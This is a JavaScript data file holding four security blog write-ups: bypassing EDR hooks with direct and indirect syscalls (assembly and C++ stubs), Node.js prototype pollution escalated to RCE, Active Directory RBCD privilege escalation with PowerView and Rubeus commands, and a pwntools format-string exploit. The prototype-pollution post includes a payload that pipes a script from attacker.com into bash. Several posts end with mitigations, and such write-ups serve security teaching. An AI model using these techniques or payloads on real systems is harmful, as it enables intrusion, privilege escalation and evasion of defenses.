/**
 * Blog Writeups & Research database
 */
const POSTS_DATA = {
    "edr-evasion-syscalls": {
        id: 4,
        title: "EDR Evasion: Subverting User-Mode Hooks via Direct System Calls (Syscalls)",
        date: "June 12, 2026",
        readTime: "15 min read",
        category: "exploit-dev",
        tags: ["Exploit Dev", "EDR Evasion", "Windows Internals", "C++"],
        summary: "An in-depth technical analysis of user-mode hooking by modern EDRs and how to construct custom assembly syscall stubs to invoke kernel operations directly, bypassing active monitoring.",
        content: `
            <p>Endpoint Detection and Response (EDR) agents monitor process activity to identify and block malicious behaviors. A key mechanism they use for user-mode visibility is <strong>API Hooking</strong>. This article breaks down how hooking works at the assembly level, how it can be detected, and how to execute direct system calls (syscalls) in C++ to subvert EDR hooks.</p>

            <h3>1. How EDRs Hook User-Mode APIs</h3>
            <p>To inspect system operations (such as memory allocation, process creation, or thread injection), EDRs hook specific functions inside <code>ntdll.dll</code>. When a standard API like <code>VirtualAlloc</code> is called, it redirects through several layers:</p>
            
            <pre><code class="language-plaintext">kernel32.dll!VirtualAlloc -> ntdll.dll!NtAllocateVirtualMemory -> Kernel (Syscall)</code></pre>

            <p>In a normal <code>ntdll.dll</code> execution flow, the function contains instructions to load the System Service Number (SSN) into the <code>EAX</code> register and execute the <code>syscall</code> instruction:</p>

            <pre><code class="language-x86asm">mov r10, rcx
mov eax, 0x18  ; SSN for NtAllocateVirtualMemory in Win10/11
syscall
ret</code></pre>

            <p>When an EDR hooks a function, it overwrites the very first instructions in <code>ntdll.dll</code> memory with a <code>jmp</code> instruction redirecting execution to the EDR's monitoring DLL (e.g., <code>edr_agent.dll</code>):</p>

            <pre><code class="language-x86asm">jmp qword ptr [edr_agent.dll + HookOffset]
nop
nop</code></pre>

            <p>If the EDR decides the arguments are benign, it executes the original instructions and forwards the request to the kernel; otherwise, it terminates the process.</p>

            <h3>2. Dynamic System Calls (Syscalls)</h3>
            <p>To bypass this monitoring, we can avoid calling <code>ntdll.dll</code> API entry points entirely. Instead, we can write our own assembly stubs that populate the registers with the correct arguments and call the <code>syscall</code> instruction directly.</p>

            <p>However, hardcoding the SSNs (e.g., <code>0x18</code>) is unreliable because SSN values change between Windows kernel builds and service packs. To solve this, we must dynamically resolve the SSN. One famous technique is <strong>Hell's Gate</strong>, which reads the local <code>ntdll.dll</code> export table in memory to locate the target function's bytes, parses them to find the <code>mov eax, [SSN]</code> pattern, and extracts the SSN.</p>

            <p>If the EDR has already hooked the function, the SSN bytes might be overwritten. <strong>Halo's Gate</strong> solves this by scanning neighboring exports (up and down) to find unhooked syscall stubs, calculating the correct SSN based on the index offset.</p>

            <h3>3. Implementing Direct Syscalls</h3>
            <p>First, we define our assembly stub in an assembly file (e.g., <code>syscalls.asm</code> using MASM syntax for x64):</p>

            <pre><code class="language-x86asm">.code

SyscallStub PROC
    mov r10, rcx
    mov eax, ecx ; Pass SSN into EAX (assumed to be first parameter)
    
    mov rcx, rdx
    mov rdx, r8
    mov r8, r9
    mov r9, [rsp + 40] ; 5th parameter on stack
    
    syscall
    ret
SyscallStub ENDP

END</code></pre>

            <p>In C++, we define the function pointer prototype and load the dynamically resolved SSN:</p>

            <pre><code class="language-cpp">#include &lt;windows.h&gt;
#include &lt;iostream&gt;

// Function prototype for NtAllocateVirtualMemory
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

extern "C" NTSTATUS SyscallStub(
    DWORD wSSN,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

int main() {
    // Let's assume we resolved the SSN for NtAllocateVirtualMemory to be 0x18
    DWORD ssnNtAlloc = 0x18; 
    
    PVOID baseAddress = NULL;
    SIZE_T regionSize = 0x1000;
    
    NTSTATUS status = SyscallStub(
        ssnNtAlloc,
        GetCurrentProcess(),
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (status == 0) {
        std::cout &lt;&lt; "[+] Memory allocated successfully at " &lt;&lt; baseAddress &lt;&lt; std::endl;
    } else {
        std::cout &lt;&lt; "[-] Allocation failed with status: 0x" &lt;&lt; std::hex &lt;&lt; status &lt;&lt; std::endl;
    }
    return 0;
}</code></pre>

            <h3>4. Advanced Evasion: Syscall Whispers & Indirect Syscalls</h3>
            <p>Modern EDRs also look for the execution of the <code>syscall</code> instruction inside non-NTDLL memory regions (like our own text section). This is flagged as an anomaly. To bypass this, we use <strong>Indirect Syscalls</strong>.</p>
            <p>Instead of executing the <code>syscall</code> instruction in our assembly stub, we jump (<code>jmp</code>) directly to the memory address of a legitimate <code>syscall</code> instruction within the unhooked portion of <code>ntdll.dll</code> itself. This forces the stack backtrace to show that the call originated from inside <code>ntdll.dll</code>, satisfying EDR return-address check validations.</p>
        `
    },
    "prototype-pollution-rce": {
        id: 3,
        title: "Node.js Prototype Pollution: Escalating to Remote Code Execution (RCE) via Gadget Chains",
        date: "May 29, 2026",
        readTime: "12 min read",
        category: "web-sec",
        tags: ["Web Security", "Node.js", "Prototype Pollution", "RCE"],
        summary: "A comprehensive analysis of Prototype Pollution in JavaScript environments, detailing how recursive object merging leads to global namespace contamination, and showcasing gadget chains to achieve RCE.",
        content: `
            <p>Prototype Pollution is a vulnerability specific to prototype-based languages like JavaScript. It occurs when an attacker can control properties injected into the root template object, <code>Object.prototype</code>. This article details the mechanics of prototype pollution, how it arises, and how to escalate it to Remote Code Execution (RCE) via gadget chains in popular Node.js modules.</p>

            <h3>1. Understanding JavaScript Prototypes</h3>
            <p>In JavaScript, objects inherit properties from a prototype object. If you create a simple object, its prototype is <code>Object.prototype</code>:</p>
            
            <pre><code class="language-javascript">const user = { name: "Alice" };
console.log(user.__proto__ === Object.prototype); // true</code></pre>

            <p>If we modify <code>Object.prototype</code>, every object in the JavaScript environment inherits the new property:</p>

            <pre><code class="language-javascript">Object.prototype.isAdmin = true;

const guest = {};
console.log(guest.isAdmin); // true</code></pre>

            <p>This is called <strong>Prototype Pollution</strong>. If an application takes user input and uses it to update an object without validating the keys, an attacker can specify <code>__proto__</code> or <code>constructor.prototype</code> to pollute the global namespace.</p>

            <h3>2. How Prototype Pollution Occurs</h3>
            <p>The vulnerability commonly occurs in recursive merge or deep clone operations, or when parsing URL queries into nested objects (e.g., using old versions of libraries like <code>lodash</code>, <code>merge-deep</code>, or <code>qs</code>).</p>

            <p>Consider the following insecure merge function:</p>

            <pre><code class="language-javascript">function merge(target, source) {
    for (let key in source) {
        if (typeof target[key] === 'object' && typeof source[key] === 'object') {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}</code></pre>

            <p>If an attacker sends a JSON payload like this:</p>

            <pre><code class="language-json">{
    "__proto__": {
        "pollutedProperty": "hacked"
    }
}</code></pre>

            <p>When the <code>merge</code> function parses <code>target["__proto__"]</code>, it resolves to the actual global <code>Object.prototype</code>, writing <code>pollutedProperty</code> directly to it.</p>

            <h3>3. Escalating to Remote Code Execution (RCE)</h3>
            <p>Polluting a property is interesting, but the ultimate goal is executing arbitrary code. To achieve this, we look for <strong>Gadgets</strong>—existing code paths in the application or its dependencies that read optional parameters from an object and execute them in a sensitive function (like <code>spawn</code> or <code>eval</code>).</p>

            <h4>Case 1: The child_process.spawn Gadget</h4>
            <p>Node.js's native <code>child_process.spawn</code> options parameter is vulnerable if polluted. In Node.js, when spawning a process, the environment variables default to <code>process.env</code>, but we can pollute <code>shell</code> or <code>env</code> parameters if they are not explicitly defined in the options parameter.</p>
            
            <p>For example, if the application spawns a script:</p>
            <pre><code class="language-javascript">const { spawn } = require('child_process');
// The options object is empty or has partial fields
spawn('node', ['script.js'], {});</code></pre>

            <p>By polluting <code>shell</code> and <code>opts.env</code> parameters, we can inject a payload that forces Node to execute a custom shell command.
            Specifically, we can pollute <code>shell</code> to point to a shell binary, and <code>env</code> variables like <code>NODE_OPTIONS</code> (which forces Node to pre-load a malicious script or execute an inline script via <code>--require</code>).</p>

            <pre><code class="language-json">{
    "__proto__": {
        "shell": "/bin/bash",
        "env": {
            "NODE_OPTIONS": "--require /proc/self/environ"
        },
        "argv0": "console.log(require('child_process').execSync('id').toString())//"
    }
}</code></pre>

            <h4>Case 2: EJS Template Engine Gadget</h4>
            <p>EJS (Embedded JavaScript templates) is a widely used template engine in Express apps. Historically, it was vulnerable to prototype pollution because it compiled templates using options configured through an options object. If an option like <code>outputFunctionName</code> was polluted, EJS would construct a function dynamically incorporating the polluted string:</p>

            <pre><code class="language-json">{
    "__proto__": {
        "client": true,
        "escapeFunction": "1; global.process.mainModule.require('child_process').execSync('curl http://attacker.com/shell.sh | bash');",
        "outputFunctionName": "x"
    }
}</code></pre>

            <p>When EJS renders any template, it compiles the template code and dynamically evaluates the polluted string, executing the shellcode payload on the underlying OS.</p>

            <h3>4. Defense & Mitigation</h3>
            <ul>
                <li><strong>Object.freeze:</strong> Freeze the prototype at startup using <code>Object.freeze(Object.prototype)</code>. This blocks modifications to the prototype.</li>
                <li><strong>Map / Null Objects:</strong> Use <code>Object.create(null)</code> to create clean, prototype-free dictionary objects.</li>
                <li><strong>Input Validation:</strong> Use JSON Schema validators to reject keys like <code>__proto__</code>, <code>constructor</code>, and <code>prototype</code> in incoming requests.</li>
            </ul>
        `
    },
    "active-directory-rbcd": {
        id: 2,
        title: "Active Directory: Deep Dive into Resource-Based Constrained Delegation (RBCD) Exploitation",
        date: "April 20, 2026",
        readTime: "12 min read",
        category: "active-directory",
        tags: ["Active Directory", "RBCD", "Kerberos", "PrivEsc"],
        summary: "An analysis of Resource-Based Constrained Delegation (RBCD) within Active Directory environments, detailing authorization mechanisms and privilege escalation methods to gain Domain Admin rights.",
        content: `
            <p>Delegation in Active Directory allows services to impersonate clients to access resources on their behalf. While traditional Constrained Delegation requires Domain Admin privileges to configure, <strong>Resource-Based Constrained Delegation (RBCD)</strong> shifts the configuration authority to the resource owner. This article analyzes the RBCD execution flow and step-by-step abuse patterns to escalate privileges to Domain Admin.</p>

            <h3>1. Traditional vs. Resource-Based Constrained Delegation</h3>
            <ul>
                <li><strong>Constrained Delegation (S4U2proxy):</strong> Configured on the service account/computer that delegates authentication. Requires modifying the <code>msDS-AllowedToDelegateTo</code> attribute, which is restricted to Domain Admins.</li>
                <li><strong>Resource-Based Constrained Delegation:</strong> Configured on the target resource account (e.g., a target server). The target computer controls who can impersonate users to it by configuring the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute. Crucially, any account that has write access (<code>GenericWrite</code> or <code>WriteProperty</code>) over the target computer object can modify this attribute—no Domain Admin privileges required!</li>
            </ul>

            <h3>2. The Exploitation Blueprint</h3>
            <p>If an attacker compromises an account with write permissions over a target server (e.g. <code>SRV-01$</code>), they can configure RBCD to gain administrative control over that server. The attack flow is as follows:</p>
            <ol>
                <li><strong>Create/Compromise a Computer Account:</strong> To use the S4U2self extension, the requesting account must have a Service Principal Name (SPN). Standard user accounts do not have SPNs, but any user can create up to 10 computer accounts by default (determined by the <code>MachineAccountQuota</code> domain parameter). We create a new computer account (e.g., <code>ATTACK-PC$</code>).</li>
                <li><strong>Configure RBCD on the Target:</strong> Modify the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute of the target server computer account (<code>SRV-01$</code>) to allow our newly created computer account (<code>ATTACK-PC$</code>) to impersonate users to it.</li>
                <li><strong>Execute S4U Flow (Rubeus):</strong> Request a Service Ticket for a high-privilege user (like <code>Administrator</code>) to the target server using S4U2self and S4U2proxy.</li>
                <li><strong>Pass the Ticket (PtT) & Compromise:</strong> Inject the ticket into our session and access target services (e.g. CIFS/WinRM) to gain root/system access.</li>
            </ol>

            <h3>3. Step-by-Step Payload Walkthrough</h3>

            <h4>Step A: Creating the Computer Account</h4>
            <p>Using Powerview or Impacket's <code>addcomputer.py</code>, we create a new computer object:</p>
            <pre><code class="language-powershell">New-DomainComputer -ComputerName "ATTACK-PC" -ComputerPassword "Pass123!" -Verbose</code></pre>

            <h4>Step B: Setting msDS-AllowedToActOnBehalfOfOtherIdentity</h4>
            <p>We retrieve the Security Descriptor of the attacker computer account, and write it to the target server's delegation attribute:</p>
            <pre><code class="language-powershell"># Get Security Descriptor of attacker computer
$AttackerSid = (Get-DomainComputer -Identity "ATTACK-PC").sid
$SD = New-Object System.Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRRC;;;$AttackerSid)")
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Overwrite target server attribute
Set-DomainObject -Identity "SRV-01" -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose</code></pre>

            <h4>Step C: Requesting & Injecting the Ticket</h4>
            <p>Using <code>Rubeus</code>, we execute the S4U2self and S4U2proxy flows to request a ticket for the user <code>Administrator</code> to access <code>cifs/SRV-01.domain.local</code>:</p>
            <pre><code class="language-powershell">Rubeus.exe s4u /user:ATTACK-PC$ /password:Pass123! /impersonateuser:Administrator /msdsspn:cifs/SRV-01.domain.local /ptt</code></pre>
            <p>This requests a ticket-granting service (TGS) ticket for the Domain Admin to our target and injects it into our local LSASS memory.</p>

            <h4>Step D: Accessing Target</h4>
            <p>We can now run <code>mimikatz</code> or standard Windows tools to perform a DCSync or access target files:</p>
            <pre><code class="language-powershell">ls \\\\SRV-01.domain.local\\C$</code></pre>

            <h3>4. Defense & Remediation</h3>
            <ul>
                <li><strong>Set MachineAccountQuota to 0:</strong> Prevent non-admin users from creating new computer accounts.</li>
                <li><strong>Audit DACLs:</strong> Periodically audit computer object permissions for dangerous write permissions (GenericWrite, WriteProperty, GenericAll).</li>
                <li><strong>Protected Users Group:</strong> Add sensitive accounts to this group to prevent them from being delegated.</li>
            </ul>
        `
    },
    "format-string-vulnerabilities": {
        id: 1,
        title: "Format String Vulnerabilities: Achieving Arbitrary Read/Write and RCE in Modern Linux Binaries",
        date: "March 18, 2026",
        readTime: "14 min read",
        category: "ctf",
        tags: ["CTFs", "Binary Exploitation", "Format Strings", "Pwn"],
        summary: "A deep dive into format string exploits, explaining stack layout leaks, arbitrary memory writes using the %n formatter, and crafting exploitation scripts using Pwntools.",
        content: `
            <p>Format string vulnerabilities occur when user-controlled input is passed directly to the format parameter of a output function (such as <code>printf</code>, <code>sprintf</code>, or <code>syslog</code>). This article walks through the memory layout mechanics of this vulnerability, how to perform arbitrary memory reads, and how to execute arbitrary memory writes to redirect program execution flow.</p>

            <h3>1. The Core Vulnerability</h3>
            <p>The vulnerability exists when developers write code like this:</p>
            <pre><code class="language-c">char buffer[100];
fgets(buffer, sizeof(buffer), stdin);
printf(buffer); // VULNERABLE! Should be: printf("%s", buffer);</code></pre>

            <p>In standard C calling conventions, the format function (e.g. <code>printf</code>) expects the format specifier as the first parameter, and retrieves additional parameters from registers and the stack. If the format string contains more format characters (like <code>%p</code> or <code>%x</code>) than arguments provided, the program reads values from the registers and stack anyway, thinking they are the arguments.</p>

            <h3>2. Arbitrary Memory Reading</h3>
            <p>Under the x86_64 ABI calling convention, the first six arguments are passed in registers: <code>RDI, RSI, RDX, RCX, R8, R9</code>, and subsequent arguments are passed on the stack. If we supply <code>printf("%p %p %p %p %p %p %p")</code>, we leak values from <code>RSI</code> through the stack.</p>

            <p>By using the <strong>Positional Parameter</strong> syntax (e.g., <code>%6$p</code>), we can direct <code>printf</code> to read the 6th parameter on the stack, which is the starting address of our input buffer itself. By placing a specific target memory address at the beginning of our input buffer and referencing it with the positional parameter using <code>%s</code> (string dereference), we can read the content at that target memory address:</p>

            <pre><code class="language-python"># Leak bytes from address 0x401020
payload = b"\\x20\\x10\\x40\\x00\\x00\\x00\\x00\\x00" + b"%6$s"</code></pre>

            <h3>3. Arbitrary Memory Writing (%n)</h3>
            <p>The <code>%n</code> format specifier is unique: instead of printing a value, it writes the number of characters printed so far to the address pointer argument. This allows us to write arbitrary integers into memory.</p>

            <p>For example, if we want to write the value <code>42</code> to an address pointer located at stack position 8:</p>
            <pre><code class="language-plaintext">%42c%8$n</code></pre>
            <p>This prints 42 padding characters and writes the value 42 to the target address pointer.</p>

            <p>To avoid massive payloads when writing large values (like 64-bit memory addresses), we write in chunks of bytes using <strong>half-write</strong> (<code>%hn</code> for 2 bytes) or <strong>byte-write</strong> (<code>%hhn</code> for 1 byte) specifiers.</p>

            <h3>4. Crafting the Exploit with Pwntools</h3>
            <p>In a CTF environment, we can automate the generation of format string payloads using Python's <code>pwntools</code> library. In this example, we overwrite the Global Offset Table (GOT) entry of the function <code>exit</code> to redirect execution to our shellcode or a <code>win</code> function.</p>

            <pre><code class="language-python">from pwn import *

# Start the vulnerable binary process
elf = ELF('./vuln_program')
p = process('./vuln_program')

# Address of target GOT entry to hijack
exit_got = elf.got['exit']
# Address of the win function to jump to
win_address = elf.symbols['win']

log.info(f"Targeting exit@GOT: {hex(exit_got)}")
log.info(f"Win function: {hex(win_address)}")

# Offset to our input buffer on the stack (found by brute-force/leak testing)
offset = 6

# Use pwntools fmtstr_payload utility to automatically structure the %hhn writes
payload = fmtstr_payload(offset, {exit_got: win_address})

# Send payload to the application
p.sendline(payload)

# Receive interactive root shell output
p.interactive()</code></pre>

            <h3>5. Modern Mitigations</h3>
            <ul>
                <li><strong>Format String checking:</strong> Modern compilers check for static format strings (e.g. <code>-Wformat -Wformat-security</code> flags fail build if unsafe printf is used).</li>
                <li><strong>FORTIFY_SOURCE:</strong> Checks at compile time if format strings are located in read-only memory blocks.</li>
                <li><strong>RELRO (Relocation Read-Only):</strong> Marks the Global Offset Table (GOT) as read-only after resolver initialization, preventing arbitrary GOT overwriting.</li>
            </ul>
        `
    }
};
